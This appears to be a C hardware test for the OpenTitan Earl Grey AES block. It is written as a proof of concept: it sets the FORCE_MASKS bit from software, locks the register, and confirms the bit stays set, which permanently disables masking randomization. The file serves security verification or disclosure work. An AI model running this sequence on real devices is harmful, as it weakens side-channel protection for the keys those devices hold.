#include <stdbool.h>
#include <stdint.h>

#include "sw/device/lib/base/mmio.h"
#include "sw/device/lib/base/bitfield.h"
#include "sw/device/lib/runtime/log.h"
#include "sw/device/lib/testing/test_framework/check.h"
#include "sw/device/lib/testing/test_framework/ottf_main.h"

#include "hw/top_earlgrey/sw/autogen/top_earlgrey.h"
#include "aes_regs.h"

OTTF_DEFINE_TEST_CONFIG();

bool test_main(void) {
  // AES MMIO region based on top-level autogen base address.
  mmio_region_t aes = mmio_region_from_addr(TOP_EARLGREY_AES_BASE_ADDR);

  LOG_INFO("AES FORCE_MASKS exploit proof-of-concept beginning");

  // 1) Read the current AUX shadowed register.
  uint32_t aux = mmio_region_read32(aes, AES_CTRL_AUX_SHADOWED_REG_OFFSET);
  LOG_INFO("Initial AES_CTRL_AUX_SHADOWED = 0x%08x", aux);

  // 2) Set the FORCE_MASKS bit to 1 using the same double-write sequence used
  //    by the driver (aes_shadowed_write). This simulates direct software
  //    control of the FORCE_MASKS CSR field that is supposed to be secure-by-default.
  uint32_t aux_force = bitfield_bit32_write(
      aux, AES_CTRL_AUX_SHADOWED_FORCE_MASKS_BIT, true);

  // Shadowed write: write twice to the shadowed register offset.
  mmio_region_write32(aes, AES_CTRL_AUX_SHADOWED_REG_OFFSET, aux_force);
  mmio_region_write32(aes, AES_CTRL_AUX_SHADOWED_REG_OFFSET, aux_force);

  // 3) Lock the AUX control register write-enable to prevent further changes.
  //    According to the DIF implementation, writing AES_CTRL_AUX_REGWEN_REG_OFFSET
  //    to 0 disables further updates. We do this to demonstrate the field can be
  //    both enabled and frozen by software.
  mmio_region_write32(aes, AES_CTRL_AUX_REGWEN_REG_OFFSET, 0);

  uint32_t aux_after = mmio_region_read32(aes, AES_CTRL_AUX_SHADOWED_REG_OFFSET);
  LOG_INFO("AES_CTRL_AUX_SHADOWED after setting FORCE_MASKS and locking = 0x%08x",
           aux_after);

  // Verify FORCE_MASKS is set.
  CHECK(bitfield_bit32_read(aux_after, AES_CTRL_AUX_SHADOWED_FORCE_MASKS_BIT) ==
            true,
        "Failed to set FORCE_MASKS (expected bit to be 1)");

  // 4) Attempt to clear the FORCE_MASKS bit. If the register is properly locked
  //    this write should have no effect and the bit should remain set.
  uint32_t aux_try_clear = bitfield_bit32_write(
      aux_after, AES_CTRL_AUX_SHADOWED_FORCE_MASKS_BIT, false);
  mmio_region_write32(aes, AES_CTRL_AUX_SHADOWED_REG_OFFSET, aux_try_clear);
  mmio_region_write32(aes, AES_CTRL_AUX_SHADOWED_REG_OFFSET, aux_try_clear);

  uint32_t aux_final = mmio_region_read32(aes, AES_CTRL_AUX_SHADOWED_REG_OFFSET);
  LOG_INFO("AES_CTRL_AUX_SHADOWED after attempted clear = 0x%08x", aux_final);

  // If the design hard-wired SecAllowForcingMasks to 1, software is able to set
  // FORCE_MASKS through the AUX CSR and lock it, permanently disabling masking
  // randomization for subsequent AES operations. We verify this by ensuring the
  // bit remains set after the lock and attempted clear.
  CHECK(bitfield_bit32_read(aux_final, AES_CTRL_AUX_SHADOWED_FORCE_MASKS_BIT) ==
            true,
        "FORCE_MASKS unexpectedly cleared despite lock - exploit did not behave as expected");

  LOG_INFO("SUCCESS: FORCE_MASKS was set and remained set after locking.\n"
           "This demonstrates software control over FORCE_MASKS (SecAllowForcingMasks hardwired=1)");

  return true;
}
